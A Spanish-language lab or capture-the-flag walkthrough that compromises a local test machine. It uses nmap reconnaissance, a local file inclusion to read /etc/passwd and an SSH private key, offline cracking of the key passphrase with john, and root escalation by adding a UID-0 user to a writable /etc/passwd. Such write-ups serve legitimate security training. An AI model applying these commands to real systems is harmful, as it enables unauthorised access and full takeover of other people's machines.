## Reconocimiento
Procedimiento rutinario con nmap.
``` bash
nmap -p- -sS -sCV --min-rate 5000 -n -Pn 192.168.0.108 > scan
```

![[Screenshot from 2023-12-23 21-38-52.png]]
- SSH en el puerto 22. En su versión 7.9 que no tiene alguna vulnerabilidad grave.
- Un pagina montada con apache en el puerto 80.
- Se realizaron pruebas de fuzzing con `gobuster` pero no se encontro nada relevante

Accedemos a la pagina en cuestión
![[Screenshot from 2023-12-23 21-41-28.png]]
Si accedemos al `modo inspeccionar` y filtramos por `php` o `?`. Podemos ver que tenemos una url interesante.
![[Screenshot from 2023-12-23 21-45-59.png]]

## Local File Inclusion (LFI)
Si cambiamos `Doctors.html` por `/etc/passwd` podemos ver que nos lista el fichero. 
![[Screenshot from 2023-12-23 21-50-04.png]]
- Tenemos tres usuarios al parecer
	- root
	- admin
	- www-data

Buscamos el `id_rsa` del usuario `admin`
![[Screenshot from 2023-12-23 21-51-56.png]]
Usamos [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)para convertir el `id_rsa` en un hash que podemos intentar crackear con [john](https://github.com/openwall/john).
``` bash
./ssh2john.ph id_rsa > id_rsa.txt

# ejecutamos john
john id_rsa.txt --wordlist=/usr/share/dict/rockyou.txt
```
![[Screenshot from 2023-12-23 23-57-33.png]]
Nos conectamos por ssh con el usuario `admin`, haciendo uso del `id_rsa` y la contraseña `unicorn`.
``` bash
ssh -i id_rsa admin@192.168.0.108
```
![[Screenshot from 2023-12-24 00-01-57.png]]

## Privsec
Algunas consideraciones al tratar de buscar alguna vulnerabilidad...
- No tenemos _sudo_ instalado, por ende no podemos usar `sudo -l`
- Si bien se ejecuta un versión 4.19 del kernel que tiene algunas vulnerabilidades. No reunimos con los requisitos necesarios para explotarlos.
- A nivel de SUID, ejecutando `find / -perm -4000 2>/dev/null` no encontramos algun ejecutable que nos permita realizar privesc. 

El paso necesario para poder escalar privilegios es la de ver en que archivos tenemos permisos de escritura, en este caso estamos buscando en todos los directorios excepto `var, proc, sys o home` directorios.

``` bash
$ find / -writable -type f 2>/dev/null | grep -viE "var|proc|sys|home"
/etc/passwd
```

Como podemos ver en este [artículo](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd) de HackTricks, podemos abusar del permiso de escritura sobre el archivo que esta en `/etc/passwd`.
``` bash
openssl passwd -1 -salt hacker hacker

# Otras opciones disponibles
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

``` bash 
# Despues agregamos el usuario hacker junto con la contraseñá generada en /etc/passwd
...
hacker:<GENERATED_PASSWORD_HERE>:0:0:Hacker:/root:/bin/bash
...
```
Ingresamos como root a traves del usuario `hacker` con su contraseña `hacker`
``` bash
su hacker
```
![[Screenshot from 2023-12-24 01-43-10.png]]
Eso es todo.